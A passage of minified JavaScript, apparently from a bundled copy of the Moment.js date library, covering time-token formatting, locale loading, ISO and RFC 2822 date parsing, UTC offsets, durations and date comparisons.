Xt(){return this.hours()%12||12}function Jt(){return this.hours()||24}function Zt(e,t){B(e,0,0,(function(){return this.localeData().meridiem(this.hours(),this.minutes(),t)}))}function en(e,t){return t._meridiemParse}function tn(e){return"p"===(e+"").toLowerCase().charAt(0)}B("H",["HH",2],0,"hour"),B("h",["hh",2],0,Xt),B("k",["kk",2],0,Jt),B("hmm",0,0,(function(){return""+Xt.apply(this)+R(this.minutes(),2)})),B("hmmss",0,0,(function(){return""+Xt.apply(this)+R(this.minutes(),2)+R(this.seconds(),2)})),B("Hmm",0,0,(function(){return""+this.hours()+R(this.minutes(),2)})),B("Hmmss",0,0,(function(){return""+this.hours()+R(this.minutes(),2)+R(this.seconds(),2)})),Zt("a",!0),Zt("A",!1),ne("hour","h"),oe("hour",13),Oe("a",en),Oe("A",en),Oe("H",Se),Oe("h",Se),Oe("k",Se),Oe("HH",Se,ve),Oe("hh",Se,ve),Oe("kk",Se,ve),Oe("hmm",Ee),Oe("hmmss",Te),Oe("Hmm",Ee),Oe("Hmmss",Te),Ue(["H","HH"],We),Ue(["k","kk"],(function(e,t,n){var r=ce(e);t[We]=24===r?0:r})),Ue(["a","A"],(function(e,t,n){n._isPm=n._locale.isPM(e),n._meridiem=e})),Ue(["h","hh"],(function(e,t,n){t[We]=ce(e),g(n).bigHour=!0})),Ue("hmm",(function(e,t,n){var r=e.length-2;t[We]=ce(e.substr(0,r)),t[Ke]=ce(e.substr(r)),g(n).bigHour=!0})),Ue("hmmss",(function(e,t,n){var r=e.length-4,i=e.length-2;t[We]=ce(e.substr(0,r)),t[Ke]=ce(e.substr(r,2)),t[Ye]=ce(e.substr(i)),g(n).bigHour=!0})),Ue("Hmm",(function(e,t,n){var r=e.length-2;t[We]=ce(e.substr(0,r)),t[Ke]=ce(e.substr(r))})),Ue("Hmmss",(function(e,t,n){var r=e.length-4,i=e.length-2;t[We]=ce(e.substr(0,r)),t[Ke]=ce(e.substr(r,2)),t[Ye]=ce(e.substr(i))}));var nn=/[ap]\.?m?\.?/i,rn=he("Hours",!0);function sn(e,t,n){return e>11?n?"pm":"PM":n?"am":"AM"}var on,an={calendar:L,longDateFormat:G,invalidDate:K,ordinal:H,dayOfMonthOrdinalParse:Q,relativeTime:J,months:et,monthsShort:tt,week:kt,weekdays:Lt,weekdaysMin:Rt,weekdaysShort:Ot,meridiemParse:nn},ln={},un={};function cn(e,t){var n,r=Math.min(e.length,t.length);for(n=0;n<r;n+=1)if(e[n]!==t[n])return n;return r}function hn(e){return e&&e.toLowerCase().replace("_","-")}function dn(e){for(var t,n,r,i,s=0;s<e.length;){for(t=(i=hn(e[s]).split("-")).length,n=(n=hn(e[s+1]))?n.split("-"):null;t>0;){if(r=pn(i.slice(0,t).join("-")))return r;if(n&&n.length>=t&&cn(i,n)>=t-1)break;t--}s++}return on}function fn(e){return null!=e.match("^[^/\\\\]*$")}function pn(t){var n=null;if(void 0===ln[t]&&e&&e.exports&&fn(t))try{n=on._abbr,O3("./locale/"+t),mn(n)}catch{ln[t]=null}return ln[t]}function mn(e,t){var n;return e&&((n=u(t)?vn(e):gn(e,t))?on=n:typeof console<"u"&&console.warn&&console.warn("Locale "+e+" not found. Did you forget to load it?")),on._abbr}function gn(e,t){if(null!==t){var n,r=an;if(t.abbr=e,null!=ln[e])C("defineLocaleOverride","use moment.updateLocale(localeName, config) to change an existing locale. moment.defineLocale(localeName, config) should only be used for creating a new locale See http://momentjs.com/guides/#/warnings/define-locale/ for more info."),r=ln[e]._config;else if(null!=t.parentLocale)if(null!=ln[t.parentLocale])r=ln[t.parentLocale]._config;else{if(null==(n=pn(t.parentLocale)))return un[t.parentLocale]||(un[t.parentLocale]=[]),un[t.parentLocale].push({name:e,config:t}),null;r=n._config}return ln[e]=new A(N(r,t)),un[e]&&un[e].forEach((function(e){gn(e.name,e.config)})),mn(e),ln[e]}return delete ln[e],null}function yn(e,t){if(null!=t){var n,r,i=an;null!=ln[e]&&null!=ln[e].parentLocale?ln[e].set(N(ln[e]._config,t)):(null!=(r=pn(e))&&(i=r._config),t=N(i,t),null==r&&(t.abbr=e),(n=new A(t)).parentLocale=ln[e],ln[e]=n),mn(e)}else null!=ln[e]&&(null!=ln[e].parentLocale?(ln[e]=ln[e].parentLocale,e===mn()&&mn(e)):null!=ln[e]&&delete ln[e]);return ln[e]}function vn(e){var t;if(e&&e._locale&&e._locale._abbr&&(e=e._locale._abbr),!e)return on;if(!s(e)){if(t=pn(e))return t;e=[e]}return dn(e)}function wn(){return x(ln)}function bn(e){var t,n=e._a;return n&&-2===g(e).overflow&&(t=n[qe]<0||n[qe]>11?qe:n[Ge]<1||n[Ge]>Ze(n[je],n[qe])?Ge:n[We]<0||n[We]>24||24===n[We]&&(0!==n[Ke]||0!==n[Ye]||0!==n[He])?We:n[Ke]<0||n[Ke]>59?Ke:n[Ye]<0||n[Ye]>59?Ye:n[He]<0||n[He]>999?He:-1,g(e)._overflowDayOfYear&&(t<je||t>Ge)&&(t=Ge),g(e)._overflowWeeks&&-1===t&&(t=Qe),g(e)._overflowWeekday&&-1===t&&(t=Xe),g(e).overflow=t),e}var _n=/^\s*((?:[+-]\d{6}|\d{4})-(?:\d\d-\d\d|W\d\d-\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?::\d\d(?::\d\d(?:[.,]\d+)?)?)?)([+-]\d\d(?::?\d\d)?|\s*Z)?)?$/,Sn=/^\s*((?:[+-]\d{6}|\d{4})(?:\d\d\d\d|W\d\d\d|W\d\d|\d\d\d|\d\d|))(?:(T| )(\d\d(?:\d\d(?:\d\d(?:[.,]\d+)?)?)?)([+-]\d\d(?::?\d\d)?|\s*Z)?)?$/,En=/Z|[+-]\d\d(?::?\d\d)?/,Tn=[["YYYYYY-MM-DD",/[+-]\d{6}-\d\d-\d\d/],["YYYY-MM-DD",/\d{4}-\d\d-\d\d/],["GGGG-[W]WW-E",/\d{4}-W\d\d-\d/],["GGGG-[W]WW",/\d{4}-W\d\d/,!1],["YYYY-DDD",/\d{4}-\d{3}/],["YYYY-MM",/\d{4}-\d\d/,!1],["YYYYYYMMDD",/[+-]\d{10}/],["YYYYMMDD",/\d{8}/],["GGGG[W]WWE",/\d{4}W\d{3}/],["GGGG[W]WW",/\d{4}W\d{2}/,!1],["YYYYDDD",/\d{7}/],["YYYYMM",/\d{6}/,!1],["YYYY",/\d{4}/,!1]],kn=[["HH:mm:ss.SSSS",/\d\d:\d\d:\d\d\.\d+/],["HH:mm:ss,SSSS",/\d\d:\d\d:\d\d,\d+/],["HH:mm:ss",/\d\d:\d\d:\d\d/],["HH:mm",/\d\d:\d\d/],["HHmmss.SSSS",/\d\d\d\d\d\d\.\d+/],["HHmmss,SSSS",/\d\d\d\d\d\d,\d+/],["HHmmss",/\d\d\d\d\d\d/],["HHmm",/\d\d\d\d/],["HH",/\d\d/]],xn=/^\/?Date\((-?\d+)/i,In=/^(?:(Mon|Tue|Wed|Thu|Fri|Sat|Sun),?\s)?(\d{1,2})\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s(\d{2,4})\s(\d\d):(\d\d)(?::(\d\d))?\s(?:(UT|GMT|[ECMP][SD]T)|([Zz])|([+-]\d{4}))$/,Cn={UT:0,GMT:0,EDT:-240,EST:-300,CDT:-300,CST:-360,MDT:-360,MST:-420,PDT:-420,PST:-480};function Dn(e){var t,n,r,i,s,o,a=e._i,l=_n.exec(a)||Sn.exec(a),u=Tn.length,c=kn.length;if(l){for(g(e).iso=!0,t=0,n=u;t<n;t++)if(Tn[t][1].exec(l[1])){i=Tn[t][0],r=!1!==Tn[t][2];break}if(null==i)return void(e._isValid=!1);if(l[3]){for(t=0,n=c;t<n;t++)if(kn[t][1].exec(l[3])){s=(l[2]||" ")+kn[t][0];break}if(null==s)return void(e._isValid=!1)}if(!r&&null!=s)return void(e._isValid=!1);if(l[4]){if(!En.exec(l[4]))return void(e._isValid=!1);o="Z"}e._f=i+(s||"")+(o||""),zn(e)}else e._isValid=!1}function Mn(e,t,n,r,i,s){var o=[Nn(e),tt.indexOf(t),parseInt(n,10),parseInt(r,10),parseInt(i,10)];return s&&o.push(parseInt(s,10)),o}function Nn(e){var t=parseInt(e,10);return t<=49?2e3+t:t<=999?1900+t:t}function An(e){return e.replace(/\([^()]*\)|[\n\t]/g," ").replace(/(\s\s+)/g," ").replace(/^\s\s*/,"").replace(/\s\s*$/,"")}function Ln(e,t,n){return!e||Ot.indexOf(e)===new Date(t[0],t[1],t[2]).getDay()||(g(n).weekdayMismatch=!0,n._isValid=!1,!1)}function On(e,t,n){if(e)return Cn[e];if(t)return 0;var r=parseInt(n,10),i=r%100;return(r-i)/100*60+i}function Rn(e){var t,n=In.exec(An(e._i));if(n){if(t=Mn(n[4],n[3],n[2],n[5],n[6],n[7]),!Ln(n[1],t,e))return;e._a=t,e._tzm=On(n[8],n[9],n[10]),e._d=wt.apply(null,e._a),e._d.setUTCMinutes(e._d.getUTCMinutes()-e._tzm),g(e).rfc2822=!0}else e._isValid=!1}function Pn(e){var t=xn.exec(e._i);null===t?(Dn(e),!1===e._isValid&&(delete e._isValid,Rn(e),!1===e._isValid&&(delete e._isValid,e._strict?e._isValid=!1:r.createFromInputFallback(e)))):e._d=new Date(+t[1])}function Fn(e,t,n){return e??t??n}function Vn(e){var t=new Date(r.now());return e._useUTC?[t.getUTCFullYear(),t.getUTCMonth(),t.getUTCDate()]:[t.getFullYear(),t.getMonth(),t.getDate()]}function Un(e){var t,n,r,i,s,o=[];if(!e._d){for(r=Vn(e),e._w&&null==e._a[Ge]&&null==e._a[qe]&&Bn(e),null!=e._dayOfYear&&(s=Fn(e._a[je],r[je]),(e._dayOfYear>mt(s)||0===e._dayOfYear)&&(g(e)._overflowDayOfYear=!0),n=wt(s,0,e._dayOfYear),e._a[qe]=n.getUTCMonth(),e._a[Ge]=n.getUTCDate()),t=0;t<3&&null==e._a[t];++t)e._a[t]=o[t]=r[t];for(;t<7;t++)e._a[t]=o[t]=null==e._a[t]?2===t?1:0:e._a[t];24===e._a[We]&&0===e._a[Ke]&&0===e._a[Ye]&&0===e._a[He]&&(e._nextDay=!0,e._a[We]=0),e._d=(e._useUTC?wt:vt).apply(null,o),i=e._useUTC?e._d.getUTCDay():e._d.getDay(),null!=e._tzm&&e._d.setUTCMinutes(e._d.getUTCMinutes()-e._tzm),e._nextDay&&(e._a[We]=24),e._w&&typeof e._w.d<"u"&&e._w.d!==i&&(g(e).weekdayMismatch=!0)}}function Bn(e){var t,n,r,i,s,o,a,l,u;null!=(t=e._w).GG||null!=t.W||null!=t.E?(s=1,o=4,n=Fn(t.GG,e._a[je],St(Hn(),1,4).year),r=Fn(t.W,1),((i=Fn(t.E,1))<1||i>7)&&(l=!0)):(s=e._locale._week.dow,o=e._locale._week.doy,u=St(Hn(),s,o),n=Fn(t.gg,e._a[je],u.year),r=Fn(t.w,u.week),null!=t.d?((i=t.d)<0||i>6)&&(l=!0):null!=t.e?(i=t.e+s,(t.e<0||t.e>6)&&(l=!0)):i=s),r<1||r>Et(n,s,o)?g(e)._overflowWeeks=!0:null!=l?g(e)._overflowWeekday=!0:(a=_t(n,r,i,s,o),e._a[je]=a.year,e._dayOfYear=a.dayOfYear)}function zn(e){if(e._f!==r.ISO_8601)if(e._f!==r.RFC_2822){e._a=[],g(e).empty=!0;var t,n,i,s,o,a,l,u=""+e._i,c=u.length,h=0;for(l=(i=q(e._f,e._locale).match(P)||[]).length,t=0;t<l;t++)s=i[t],(n=(u.match(Re(s,e))||[])[0])&&((o=u.substr(0,u.indexOf(n))).length>0&&g(e).unusedInput.push(o),u=u.slice(u.indexOf(n)+n.length),h+=n.length),U[s]?(n?g(e).empty=!1:g(e).unusedTokens.push(s),ze(s,n,e)):e._strict&&!n&&g(e).unusedTokens.push(s);g(e).charsLeftOver=c-h,u.length>0&&g(e).unusedInput.push(u),e._a[We]<=12&&!0===g(e).bigHour&&e._a[We]>0&&(g(e).bigHour=void 0),g(e).parsedDateParts=e._a.slice(0),g(e).meridiem=e._meridiem,e._a[We]=$n(e._locale,e._a[We],e._meridiem),null!==(a=g(e).era)&&(e._a[je]=e._locale.erasConvertYear(a,e._a[je])),Un(e),bn(e)}else Rn(e);else Dn(e)}function $n(e,t,n){var r;return null==n?t:null!=e.meridiemHour?e.meridiemHour(t,n):(null!=e.isPM&&((r=e.isPM(n))&&t<12&&(t+=12),!r&&12===t&&(t=0)),t)}function jn(e){var t,n,r,i,s,o,a=!1,l=e._f.length;if(0===l)return g(e).invalidFormat=!0,void(e._d=new Date(NaN));for(i=0;i<l;i++)s=0,o=!1,t=_({},e),null!=e._useUTC&&(t._useUTC=e._useUTC),t._f=e._f[i],zn(t),y(t)&&(o=!0),s+=g(t).charsLeftOver,s+=10*g(t).unusedTokens.length,g(t).score=s,a?s<r&&(r=s,n=t):(null==r||s<r||o)&&(r=s,n=t,o&&(a=!0));f(e,n||t)}function qn(e){if(!e._d){var t=ie(e._i),n=void 0===t.day?t.date:t.day;e._a=d([t.year,t.month,n,t.hour,t.minute,t.second,t.millisecond],(function(e){return e&&parseInt(e,10)})),Un(e)}}function Gn(e){var t=new S(bn(Wn(e)));return t._nextDay&&(t.add(1,"d"),t._nextDay=void 0),t}function Wn(e){var t=e._i,n=e._f;return e._locale=e._locale||vn(e._l),null===t||void 0===n&&""===t?v({nullInput:!0}):("string"==typeof t&&(e._i=t=e._locale.preparse(t)),E(t)?new S(bn(t)):(h(t)?e._d=t:s(n)?jn(e):n?zn(e):Kn(e),y(e)||(e._d=null),e))}function Kn(e){var t=e._i;u(t)?e._d=new Date(r.now()):h(t)?e._d=new Date(t.valueOf()):"string"==typeof t?Pn(e):s(t)?(e._a=d(t.slice(0),(function(e){return parseInt(e,10)})),Un(e)):o(t)?qn(e):c(t)?e._d=new Date(t):r.createFromInputFallback(e)}function Yn(e,t,n,r,i){var a={};return(!0===t||!1===t)&&(r=t,t=void 0),(!0===n||!1===n)&&(r=n,n=void 0),(o(e)&&l(e)||s(e)&&0===e.length)&&(e=void 0),a._isAMomentObject=!0,a._useUTC=a._isUTC=i,a._l=n,a._i=e,a._f=t,a._strict=r,Gn(a)}function Hn(e,t,n,r){return Yn(e,t,n,r,!1)}r.createFromInputFallback=k("value provided is not in a recognized RFC2822 or ISO format. moment construction falls back to js Date(), which is not reliable across all browsers and versions. Non RFC2822/ISO date formats are discouraged. Please refer to http://momentjs.com/guides/#/warnings/js-date/ for more info.",(function(e){e._d=new Date(e._i+(e._useUTC?" UTC":""))})),r.ISO_8601=function(){},r.RFC_2822=function(){};var Qn=k("moment().min is deprecated, use moment.max instead. http://momentjs.com/guides/#/warnings/min-max/",(function(){var e=Hn.apply(null,arguments);return this.isValid()&&e.isValid()?e<this?this:e:v()})),Xn=k("moment().max is deprecated, use moment.min instead. http://momentjs.com/guides/#/warnings/min-max/",(function(){var e=Hn.apply(null,arguments);return this.isValid()&&e.isValid()?e>this?this:e:v()}));function Jn(e,t){var n,r;if(1===t.length&&s(t[0])&&(t=t[0]),!t.length)return Hn();for(n=t[0],r=1;r<t.length;++r)(!t[r].isValid()||t[r][e](n))&&(n=t[r]);return n}function Zn(){return Jn("isBefore",[].slice.call(arguments,0))}function er(){return Jn("isAfter",[].slice.call(arguments,0))}var tr=function(){return Date.now?Date.now():+new Date},nr=["year","quarter","month","week","day","hour","minute","second","millisecond"];function rr(e){var t,n,r=!1,i=nr.length;for(t in e)if(a(e,t)&&(-1===$e.call(nr,t)||null!=e[t]&&isNaN(e[t])))return!1;for(n=0;n<i;++n)if(e[nr[n]]){if(r)return!1;parseFloat(e[nr[n]])!==ce(e[nr[n]])&&(r=!0)}return!0}function ir(){return this._isValid}function sr(){return Cr(NaN)}function or(e){var t=ie(e),n=t.year||0,r=t.quarter||0,i=t.month||0,s=t.week||t.isoWeek||0,o=t.day||0,a=t.hour||0,l=t.minute||0,u=t.second||0,c=t.millisecond||0;this._isValid=rr(t),this._milliseconds=+c+1e3*u+6e4*l+1e3*a*60*60,this._days=+o+7*s,this._months=+i+3*r+12*n,this._data={},this._locale=vn(),this._bubble()}function ar(e){return e instanceof or}function lr(e){return e<0?-1*Math.round(-1*e):Math.round(e)}function ur(e,t,n){var r,i=Math.min(e.length,t.length),s=Math.abs(e.length-t.length),o=0;for(r=0;r<i;r++)(n&&e[r]!==t[r]||!n&&ce(e[r])!==ce(t[r]))&&o++;return o+s}function cr(e,t){B(e,0,0,(function(){var e=this.utcOffset(),n="+";return e<0&&(e=-e,n="-"),n+R(~~(e/60),2)+t+R(~~e%60,2)}))}cr("Z",":"),cr("ZZ",""),Oe("Z",Ne),Oe("ZZ",Ne),Ue(["Z","ZZ"],(function(e,t,n){n._useUTC=!0,n._tzm=dr(Ne,e)}));var hr=/([\+\-]|\d\d)/gi;function dr(e,t){var n,r,i=(t||"").match(e);return null===i?null:0===(r=60*(n=((i[i.length-1]||[])+"").match(hr)||["-",0,0])[1]+ce(n[2]))?0:"+"===n[0]?r:-r}function fr(e,t){var n,i;return t._isUTC?(n=t.clone(),i=(E(e)||h(e)?e.valueOf():Hn(e).valueOf())-n.valueOf(),n._d.setTime(n._d.valueOf()+i),r.updateOffset(n,!1),n):Hn(e).local()}function pr(e){return-Math.round(e._d.getTimezoneOffset())}function mr(e,t,n){var i,s=this._offset||0;if(!this.isValid())return null!=e?this:NaN;if(null!=e){if("string"==typeof e){if(null===(e=dr(Ne,e)))return this}else Math.abs(e)<16&&!n&&(e*=60);return!this._isUTC&&t&&(i=pr(this)),this._offset=e,this._isUTC=!0,null!=i&&this.add(i,"m"),s!==e&&(!t||this._changeInProgress?Lr(this,Cr(e-s,"m"),1,!1):this._changeInProgress||(this._changeInProgress=!0,r.updateOffset(this,!0),this._changeInProgress=null)),this}return this._isUTC?s:pr(this)}function gr(e,t){return null!=e?("string"!=typeof e&&(e=-e),this.utcOffset(e,t),this):-this.utcOffset()}function yr(e){return this.utcOffset(0,e)}function vr(e){return this._isUTC&&(this.utcOffset(0,e),this._isUTC=!1,e&&this.subtract(pr(this),"m")),this}function wr(){if(null!=this._tzm)this.utcOffset(this._tzm,!1,!0);else if("string"==typeof this._i){var e=dr(Me,this._i);null!=e?this.utcOffset(e):this.utcOffset(0,!0)}return this}function br(e){return!!this.isValid()&&(e=e?Hn(e).utcOffset():0,(this.utcOffset()-e)%60==0)}function _r(){return this.utcOffset()>this.clone().month(0).utcOffset()||this.utcOffset()>this.clone().month(5).utcOffset()}function Sr(){if(!u(this._isDSTShifted))return this._isDSTShifted;var e,t={};return _(t,this),(t=Wn(t))._a?(e=t._isUTC?p(t._a):Hn(t._a),this._isDSTShifted=this.isValid()&&ur(t._a,e.toArray())>0):this._isDSTShifted=!1,this._isDSTShifted}function Er(){return!!this.isValid()&&!this._isUTC}function Tr(){return!!this.isValid()&&this._isUTC}function kr(){return!!this.isValid()&&this._isUTC&&0===this._offset}r.updateOffset=function(){};var xr=/^(-|\+)?(?:(\d*)[. ])?(\d+):(\d+)(?::(\d+)(\.\d*)?)?$/,Ir=/^(-|\+)?P(?:([-+]?[0-9,.]*)Y)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)W)?(?:([-+]?[0-9,.]*)D)?(?:T(?:([-+]?[0-9,.]*)H)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)S)?)?$/;function Cr(e,t){var n,r,i,s=e,o=null;return ar(e)?s={ms:e._milliseconds,d:e._days,M:e._months}:c(e)||!isNaN(+e)?(s={},t?s[t]=+e:s.milliseconds=+e):(o=xr.exec(e))?(n="-"===o[1]?-1:1,s={y:0,d:ce(o[Ge])*n,h:ce(o[We])*n,m:ce(o[Ke])*n,s:ce(o[Ye])*n,ms:ce(lr(1e3*o[He]))*n}):(o=Ir.exec(e))?(n="-"===o[1]?-1:1,s={y:Dr(o[2],n),M:Dr(o[3],n),w:Dr(o[4],n),d:Dr(o[5],n),h:Dr(o[6],n),m:Dr(o[7],n),s:Dr(o[8],n)}):null==s?s={}:"object"==typeof s&&("from"in s||"to"in s)&&(i=Nr(Hn(s.from),Hn(s.to)),(s={}).ms=i.milliseconds,s.M=i.months),r=new or(s),ar(e)&&a(e,"_locale")&&(r._locale=e._locale),ar(e)&&a(e,"_isValid")&&(r._isValid=e._isValid),r}function Dr(e,t){var n=e&&parseFloat(e.replace(",","."));return(isNaN(n)?0:n)*t}function Mr(e,t){var n={};return n.months=t.month()-e.month()+12*(t.year()-e.year()),e.clone().add(n.months,"M").isAfter(t)&&--n.months,n.milliseconds=+t-+e.clone().add(n.months,"M"),n}function Nr(e,t){var n;return e.isValid()&&t.isValid()?(t=fr(t,e),e.isBefore(t)?n=Mr(e,t):((n=Mr(t,e)).milliseconds=-n.milliseconds,n.months=-n.months),n):{milliseconds:0,months:0}}function Ar(e,t){return function(n,r){var i;return null!==r&&!isNaN(+r)&&(C(t,"moment()."+t+"(period, number) is deprecated. Please use moment()."+t+"(number, period). See http://momentjs.com/guides/#/warnings/add-inverted-param/ for more info."),i=n,n=r,r=i),Lr(this,Cr(n,r),e),this}}function Lr(e,t,n,i){var s=t._milliseconds,o=lr(t._days),a=lr(t._months);e.isValid()&&(i=i??!0,a&&ut(e,de(e,"Month")+a*n),o&&fe(e,"Date",de(e,"Date")+o*n),s&&e._d.setTime(e._d.valueOf()+s*n),i&&r.updateOffset(e,o||a))}Cr.fn=or.prototype,Cr.invalid=sr;var Or=Ar(1,"add"),Rr=Ar(-1,"subtract");function Pr(e){return"string"==typeof e||e instanceof String}function Fr(e){return E(e)||h(e)||Pr(e)||c(e)||Ur(e)||Vr(e)||null==e}function Vr(e){var t,n,r=o(e)&&!l(e),i=!1,s=["years","year","y","months","month","M","days","day","d","dates","date","D","hours","hour","h","minutes","minute","m","seconds","second","s","milliseconds","millisecond","ms"],u=s.length;for(t=0;t<u;t+=1)n=s[t],i=i||a(e,n);return r&&i}function Ur(e){var t=s(e),n=!1;return t&&(n=0===e.filter((function(t){return!c(t)&&Pr(e)})).length),t&&n}function Br(e){var t,n,r=o(e)&&!l(e),i=!1,s=["sameDay","nextDay","lastDay","nextWeek","lastWeek","sameElse"];for(t=0;t<s.length;t+=1)n=s[t],i=i||a(e,n);return r&&i}function zr(e,t){var n=e.diff(t,"days",!0);return n<-6?"sameElse":n<-1?"lastWeek":n<0?"lastDay":n<1?"sameDay":n<2?"nextDay":n<7?"nextWeek":"sameElse"}function $r(e,t){1===arguments.length&&(arguments[0]?Fr(arguments[0])?(e=arguments[0],t=void 0):Br(arguments[0])&&(t=arguments[0],e=void 0):(e=void 0,t=void 0));var n=e||Hn(),i=fr(n,this).startOf("day"),s=r.calendarFormat(this,i)||"sameElse",o=t&&(D(t[s])?t[s].call(this,n):t[s]);return this.format(o||this.localeData().calendar(s,this,Hn(n)))}function jr(){return new S(this)}function qr(e,t){var n=E(e)?e:Hn(e);return!(!this.isValid()||!n.isValid())&&("millisecond"===(t=re(t)||"millisecond")?this.valueOf()>n.valueOf():n.valueOf()<this.clone().startOf(t).valueOf())}function Gr(e,t){var n=E(e)?e:Hn(e);return!(!this.isValid()||!n.isValid())&&("millisecond"===(t=re(t)||"millisecond")?this.valueOf()<n.valueOf():this.clone().endOf(t).valueOf()<n.valueOf())}function Wr(e,t,n,r){var i=E(e)?e:Hn(e),s=E(t)?t:Hn(t);return!!(this.isValid()&&i.isValid()&&s.isValid())&&("("===(r=r||"()")[0]?this.isAfter(i,n):!this.isBefore(i,n))&&(")"===r[1]?this.isBefore(s,n):!this.isAfter(s,n))}function Kr(e,t){var n,r=E(e)?e:Hn(e);return!(!this.isValid()||!r.isValid())&&("millisecond"===(t=re(t)||"millisecond")?this.valueOf()===r.valueOf():(n=r.valueOf(),this.clone().startOf(t).valueOf()<=n&&n<=this.clone().endOf(t).valueOf()))}function Yr(e,t){return this.isSame(e,t)||this.isAfter(e,t)}function Hr(e,t){return this.isSame(e,t)||this.isBefore(e,t)}function Qr(e,t,n){var r,i,s;if(!this.isValid())return NaN;if(!(r=fr(e,this)).isValid())return NaN;switch(i=6e4*(r.utcOffset()-this.utcOffset()),t=re(t)){case"year":s=Xr(this,r)/12;break;case"month":s=Xr(this,r);break;case"quarter":s=Xr(this,r)/3;break;case"second":s=(this-r)/1e3;break;case"minute":s=(this-r)/6e4;break;case"hour":s=(this-r)/36e5;break;case"day":s=(this-r-i)/864e5;break;case"week":s=(this-r-i)/6048e5;break;default:s=this-r}return n?s:ue(s)}function Xr(e,t){if(e.date()<t.date())return-Xr(t,e);var n,r=12*(t.year()-e.year())+(t.month()-e.month()),i=e.clone().add(r,"months");return n=t-i<0?(t-i)/(i-e.clone().add(r-1,"months")):(t-i)/(e.clone().add(r+1,"months")-i),-(r+n)||0}function Jr(){return this.clone().locale("en").format("ddd MMM DD YYYY HH:mm:ss [GMT]ZZ")}function Zr(e){if(!this.isValid())return null;var t=!0!==e,n=t?this.clone().utc():this;return n.year()<0||n.year()>9999?j(n,t?"YYYYYY-MM-DD[T]HH:mm:ss.SSS[Z]":"YYYYYY-MM-DD[T]HH:mm:ss.SSSZ"):D(Date.prototype.toISOString)?t?this.toDate().toISOString():new Date(this.valueOf()+60*this.utcOffset()*1e3).toISOString().replace("Z",j(n,"Z")):j(n,t?"YYYY-MM-DD[T]HH:mm:ss.SSS[Z]":"YYYY-MM-DD[T]HH:mm:ss.SSSZ")}function ei(){if(!this.isValid())return"moment.invalid(/* "+this._i+" */)";var e,t,n,r,i="moment",s="";return this.isLocal()||(i=0===this.utcOffset()?"moment.utc":"moment.parseZone",s="Z"),e="["+i+'("]',t=0<=this.year()&&this.year()<=9999?"YYYY":"YYYYYY",n="-MM-DD[T]HH:mm:ss.SSS",r=s+'[")]',this.format(e+t+n+r)}function ti(e){e||(e=this.isUtc()?r.defaultFormatUtc:r.defaultFormat);var t=j(this,e);return this.localeData().postformat(t)}function ni(e,t){return this.isValid()&&(E(e)&&e.isValid()||Hn(e).isValid())?Cr({to:this,from:e}).locale(this.locale()).humanize(!t):this.localeData().invalidDate()}function ri(e){return this.from(Hn(),e)}function ii(e,t){return this.isValid()&&(E(e)&&e.isValid()||Hn(e).isValid())?Cr({from:this,to:e}).locale(this.locale()).humanize(!t):this.localeData().invalidDate()}function si(e){return this.to(Hn(),e)}function oi(e){var t;return void 0===e?this._locale._abbr:(null!=(t=vn(e))&&(this._locale=t),this)}r.defaultFormat="YYYY-MM-DDTHH:mm:ssZ",r.defaultFormatUtc="YYYY-MM-DDTHH:mm:ss[Z]";var ai=k("moment().lang() is deprecated. Instead, use moment().localeData() to get the language configuration. Use moment().locale() to change languages.",(function(e){return void 0===e?this.localeData():this.locale(e)}));function li(){return this._locale}var ui=1e3,ci=60*ui,hi=60*ci,di=3506328*hi;function fi(e,t){return(e%t+t)%t}function pi(e,t,n){return e<100&&e>=0?new Date(e+400,t,n)-di:new Date(e,t,n).valueOf()}function mi(e,t,n){return e<100&&e>=0?Date.UTC(e+400,t,n)-di:Date.UTC(e,t,n)}function gi(e){var t,n;if(void 0===(e=re(e))||"millisecond"===e||!this.isValid())return this;switch(n=this._isUTC?mi:pi,e){case"year":t=n(this.year(),0,1);break;case"quarter":t=n(this.year(),this.month()-this.month()%3,1);break;case"month":t=n(this.year(),this.month(),1);break;case"week":t=n(this.year(),this.month(),this.date()-this.weekday());break;case"isoWeek":t=n(this.year(),this.month(),this.date()-(this.isoWeekday()-1));break;case"day":case"date":t=n(this.year(),this.month(),this.date());break;case"hour":t=this._d.valueOf(),t-=fi(t+(this._isUTC?0:this.utcOffset()*ci),hi);break;case"minute":t=this._d.valueOf(),t-=fi(t,ci);break;case"second":t=this._d.valueOf(),t-=fi(t,ui)}return this._d.setTime(t),r.updateOffset(this,!0),this}function yi(e){var t,n;if(void 0===(e=re(e))||"millisecond"===e||!this.isValid())return this;switch(n=this._isUTC?mi:pi,e){case"year":t=n(this.year()+1,0,1)-1;break;case"quarter":t=n(this.year(),this.month()-this.month()%3+3,1)-1;break;case"month":t=n(this.year(),this.month()+1,1)-1;break;case"week":t=n(this.year(),this.month(),this.date()-this.weekday()+7)-1;break;case"isoWeek":t=n(this.year(),this.month(),this.date()-(this.isoWeekday()-1)+7)-1;break;case"day":case"date":t=n(this.year(),this.month(),this.date()+1)-1;break;case"hour":t=this._d.valueOf(),t+=hi-fi(t+(this._isUTC?0:this.utcOffset()*ci),hi)-1;break;case"minute":t=this._d.valueOf(),t+=ci-fi(t,ci)-1;break;case"second":t=this._d.valueOf(),t+=ui-fi(t,ui)-1}return this._d.setTime(t),r.updateOffset(this,!0),this}function vi(){return this._d.valueOf()-6e4*(this._offset||0)}function wi(){return Math.floor(this.valueOf()/1e3)}function bi(){return new Date(this.valueOf())}function _i(){var e=this;return[e.year(),e.month(),e.date(),e.hour(),e.minute(),e.second(),e.millisecond()]}function Si(){var e=this;return{years:e.year(),months:e.month(),date:e.date(),hours:e.hours(),minutes:e.minutes(),seconds:e.seconds(),milliseconds:e.milliseconds()}}function Ei(){return this.isValid()?this.toISOString():null}function Ti(){return y(this)}function ki(){return f({},g(this))}function xi(){return g(this).overflow}function Ii(){return{input:this._i,format:this._f,locale:this._locale,isUTC:this._isUTC,strict:this._strict}}function Ci(e,t){var n,i,s,o=this._eras||vn("en")._eras;for(n=0,i=o.length;n<i;++n){switch(typeof o[n].since){case"string":s=r(o[n].since).startOf("day"),o[n].since=s.valueOf()}switch(typeof o[n].until){case"undefined":o[n].until=1/0;break;case"string":s=r(o[n].until).startOf("day").valueOf(),o[n].until=s.valueOf()}}return o}function Di(e,t,n){var 